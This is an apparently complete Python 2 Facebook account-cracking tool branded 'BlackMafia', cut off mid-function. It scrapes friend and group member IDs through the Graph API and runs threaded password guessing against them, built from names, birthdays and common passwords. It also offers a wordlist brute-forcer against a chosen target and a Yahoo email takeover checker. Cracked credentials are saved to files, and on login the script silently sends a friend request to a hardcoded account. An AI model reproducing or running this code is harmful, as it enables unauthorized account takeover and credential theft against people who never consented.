#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To lovehacker
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser

#-Setting-#
########
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]

#-failed-#
def failed():
	print "\033[1;91m[!] Exit"
	os.sys.exit()

#-Animation-#
def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(00000.1)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'


#Dev:love_hacker
##### LOGO #####
logo = """
\033[1;96m▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇▇▇\033[1;91m▇▇▇▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇
\033[1;96m▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇ B\033[1;91m M ▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇
\033[1;96m▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇ L\033[1;91m A ▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇
\033[1;96m▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇ A\033[1;91m F ▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇
\033[1;96m▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇ C\033[1;91m I ▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇
\033[1;96m▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇ K\033[1;91m A ▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇
\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇  \033[1;91m   ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇▇▇\033[1;91m▇▇▇▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
\033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m     ▇▇  03094161457 ▇▇
\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"""
# load #
def load():
	tiload = ['.   ','..  ','... ']
	for o in tiload:
		print("\r\033[1;91m[●] \033[1;92mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
print  """
\033[1;91m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
\033[1;91m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
\033[1;91m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
\033[1;91m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░
\033[1;91m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗
\033[1;91m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
\033[1;91m███╗░░░███╗░█████╗░███████╗██╗░█████╗░
\033[1;91m████╗░████║██╔══██╗██╔════╝██║██╔══██╗
\033[1;91m██╔████╔██║███████║█████╗░░██║███████║
\033[1;91m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
\033[1;91m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
\033[1;91m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"""
CorrectUsername = "BlackMafia"
CorrectPassword = "lovehacker"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m📋 \x1b[1;91mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m🗝 \x1b[1;91mTool Password  \x1b[1;97m»» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')

##### choices Login #####
def tool_main_function():
	os.system('clear')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Normal login"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Login using token"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit"
	print "\033[1;97m║"
	login_method = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if login_method =="":
		print"\033[1;91m[!] Wrong input"
		failed()
	elif login_method =="1":
		login()
	elif login_method =="2":
		fbtoken()
	elif login_method =="0":
		failed()
	else:
		print"\033[1;91m[!] Wrong input"
		failed()

##### LOGIN #####
#================#
def login():
	os.system('clear')
	try:
		fb_token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print('\033[1;91m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
		pwd = getpass.getpass('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')
		load()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;91m[!] No connection"
			failed()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				pick = open("login.txt", 'w')
				pick.write(z['access_token'])
				pick.close()
				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
                                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91m[!] No connection"
				failed()
		if 'checkpoint' in url:
			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			failed()
		else:
			print("\n\033[1;91m[!] Login Failed")
			os.system('rm -rf login.txt')
			time.sleep(0.01)
			login()

##### TOKEN #####
def fbtoken():
	os.system('clear')
	print logo
	fb_token = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
		a = json.loads(otw.text)
		fb_name = a['name']
		pick = open("login.txt", 'w')
		pick.write(fb_token)
		pick.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			failed()
		elif e =="y":
			login()
		else:
			failed()

##### MENU ##########################################
def menu():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
		a = json.loads(otw.text)
		fb_name = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91m[!] \033[1;93mAccount Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[!] No connection"
		failed()
	os.system("reset")
	print logo
	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+fb_name+"\033[1;97m"
	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id
	print "\033[1;97m╚"+40*"═"
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Hack facebook account               "
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Show token           "
        print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Update           "
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m LogOut            "
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit the programs          "
	print "║"
	choices()
#-
def choices():
	pick = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if pick =="":
		print "\033[1;91m[!] Wrong input"
		choices()
	elif pick =="1":
		menu_hack()
	elif pick =="2":
		os.system('clear')
		print logo
		fb_token=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;92mYour token\033[1;91m :\033[1;97m "+fb_token
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
        elif pick =="3":
                os.system('clear')
                print logo
                print 40 * '\033[1;97m\xe2\x95\x90'
                os.system('git pull origin master')
                raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')
                menu()
	elif pick =="4":
		os.system('rm -rf login.txt')
		os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
		failed()
	elif pick =="0":
		failed()
	else:
		print "\033[1;91m[!] Wrong input"
		choices()
##### MENU HACK #####
def menu_hack():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Super Multi Bruteforce Facebook"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m BruteForce(\033[1;92mTarget\033[1;97m)"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Yahoo Checker"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	choose_hack()
#----choices
def choose_hack():
	hack = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if hack=="":
		print "\033[1;91m[!] Wrong input"
		choose_hack()
	elif hack =="1":
		super()
	elif hack =="2":
		brute()
	elif hack =="3":
		menu_yahoo()
	elif hack =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		choose_hack()
############### SUPER MBF ################
def super():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.0)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Crack with list friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Crack from Public friend ID"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Crack from member group"
        print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Crack from File"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	choices_super()

def choices_super():
	peak = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if peak =="":
		print "\033[1;91m[!] Wrong input"
		choices_super()
	elif peak =="1":
		os.system('clear')
		print logo
		jalan('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+fb_token)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
			op = json.loads(seat.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			super()
		jalan('\033[1;91m[✺] \033[1;92mGet all id from friend \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+fb_token)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		idg=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+fb_token)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			super()
		jalan('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=9999999999999&access_token='+fb_token)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
        elif peak == "4":
                os.system('clear')
                print logo
                try:
                        idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')
                        for line in open(idlist,'r').readlines():
                                id.append(line.strip())
                except KeyError:
                        print '\033[1;91m[!] File not found'
                        raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')
                        super()
	elif peak =="0":
		menu_hack()
	else:
		print "\033[1;91m[!] Wrong input"
		choices_super()

        print "\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
        jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	tiload = ['.   ','..  ','... ']
	for o in tiload:
		print("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
        print 42*"\033[1;97m═"


	##### crack #####
	def main(arg):
		global checkpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			#Pass1
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+fb_token)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass1+" =>"+z['name'])
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					cek = open("out/super_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					checkpoint.append(user+pass1)
				else:
					#Pass2
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
						z = json.loads(x.text)
						print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass2+" =>"+z['name'])
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							cek = open("out/super_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							checkpoint.append(user+pass2)
						else:
							#Pass3
							pass3 = b['last_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								z = json.loads(x.text)
								print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass3+" =>"+z['name'])
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									cek = open("out/super_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									checkpoint.append(user+pass3)
								else:
									#Pass4
									lahir = b['birthday']
									pass4 = lahir.replace('/', '')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
										z = json.loads(x.text)
										print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass4+" =>"+z['name'])
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											cek = open("out/super_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											checkpoint.append(user+pass4)
										else:
											#Pass5
											pass5 = "786786","Pakistan"
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
												z = json.loads(x.text)
												print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass5+" =>"+z['name'])
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													cek = open("out/super_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													checkpoint.append(user+pass5)
												else:
													#Pass6
													pass6 = "Pakistan786","Pakistan123"
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
														z = json.loads(x.text)
														print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass6+" =>"+z['name'])
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															cek = open("out/super_cp.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															checkpoint.append(user+pass6)
														else:
															#Pass7
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+fb_token)
															b = json.loads(a.text)
															pass7 = "1234567890","password123","Khan123","Pakarmy","","iloveyou","princess","playboy"
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
																z = json.loads(x.text)
																print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass7+" =>"+z['name'])
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	cek = open("out/super_cp.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	checkpoint.append(user+pass7)
                                                                                                                                else:
                                                                                                                                        #Pass8
                                                                                                                                         a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+fb_token)
                                                                                                                                         b = json.loads(a.text)
                                                                                                                                         pass8 = "january","february","march","april","may","june","july","august","september","november","december"
                                                                                                                                         data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%252525257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                         q = json.load(data)
                                                                                                                                         if 'access_token' in q:
                                                                                                                                                 x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                                                                                                                                 z = json.loads(x.text)
                                                                                                                                                 print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass8+" =>"+z['name'])
                                                                                                                                                 oks.append(user+pass8)
                                                                                                                                         else:
                                                                                                                                                 if 'www.facebook.com' in q["error_msg"]:
                                                                                                                                                         cek = open("out/super_cp.txt", "a")
                                                                                                                                                         cek.write(user+"|"+pass8+"\n")
                                                                                                                                                         cek.close()
                                                                                                                                                         checkpoint.append(user+pass8)

		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal OK/CP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(checkpoint))
	print("\033[1;91m[+] \033[1;92mCP File saved \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	super()
######################################################

##### BRUTE FORCE #####
def brute():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	try:
		email = raw_input("\033[1;91m[+] \033[1;92mID\033[1;97m/\033[1;92mEmail\033[1;97m/\033[1;92mHp \033[1;97mTarget \033[1;91m:\033[1;97m ")
		passw = raw_input("\033[1;91m[+] \033[1;92mWordlist \033[1;97mext(list.txt) \033[1;91m: \033[1;97m")
		total = open(passw,"r")
		total = total.readlines()
		print 42*"\033[1;97m═"
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTarget \033[1;91m:\033[1;97m "+email
		print "\033[1;91m[+] \033[1;92mTotal\033[1;96m "+str(len(total))+" \033[1;92mPassword"
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		sandi = open(passw,"r")
		for pw in sandi:
			try:
				pw = pw.replace("\n","")
				sys.stdout.write("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;91m: \033[1;97m"+pw)
				sys.stdout.flush()
				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				mpsh = json.loads(data.text)
				if 'access_token' in mpsh:
					dapat = open("Brute.txt", "w")
					dapat.write(email+" | "+pw+"\n")
					dapat.close()
					print "\n\033[1;91m[+] \033[1;92mFound"
					print 42*"\033[1;97m═"
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
					failed()
				elif 'www.facebook.com' in mpsh["error_msg"]:
					ceks = open("Brutecheckpoint.txt", "w")
					ceks.write(email+" | "+pw+"\n")
					ceks.close()
					print "\n\033[1;91m[+] \033[1;92mFound"
					print 42*"\033[1;97m═"
					print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
					failed()
			except requests.exceptions.ConnectionError:
				print"\033[1;91m[!] Connection Error"
				time.sleep(0.01)
	except IOError:
		print ("\033[1;91m[!] File not found")
		tanyaw()
def tanyaw():
	why = raw_input("\033[1;91m[?] \033[1;92mCreate wordlist ? \033[1;92m[y/n]\033[1;91m:\033[1;97m ")
	if why =="":
		print "\033[1;91m[!] Wrong"
		tanyaw()
	elif why =="y":
		wordlist()
	elif why =="Y":
		wordlist()
	elif why =="n":
		menu_hack()
	elif why =="N":
		menu_hack()
	else:
		print "\033[1;91m[!] Wrong"
		tanyaw()

##### YAHOO CHECKER #####
#---------------------------------------------------#
def menu_yahoo():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m With list friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Clone from friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Clone from member group"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Using file"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	choose_yahoo()
#----choices
def choose_yahoo():
	go = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if go =="":
		print "\033[1;91m[!] Wrong"
		choose_yahoo()
	elif go =="1":
		yahoofriends()
	elif go =="2":
		yahoofromfriends()
	elif go =="3":
		yahoomember()
	elif go =="4":
		yahoolist()
	elif go =="0":
		menu_hack()
	else:
		print "\033[1;91m[!] Wrong"
		choose_yahoo()

##### LIST FRIEND #####
def yahoofriends():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
	jalan('\033[1;91m[✺] \033[1;92mGetting email friend \033[1;97m...')
	friends = requests.get('https://graph.facebook.com/me/friends?access_token='+fb_token)
	kimak = json.loads(friends.text)
	save = open('out/MailVuln.txt','w')
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for w in kimak['data']:
		jml +=1
		mpsh.append(jml)
		id = w['id']
		fb_name = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+fb_token)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				click = br.submit().read()
				seat = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = seat.search(click).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					save.write(mail + '\n')
					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+fb_name)
					sucessful.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(sucessful))
	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/MailVuln.txt"
	save.close()
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_yahoo()

##### CLONE FROM FRIEND #####
def yahoofromfriends():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	mpsh = []
	jml = 0
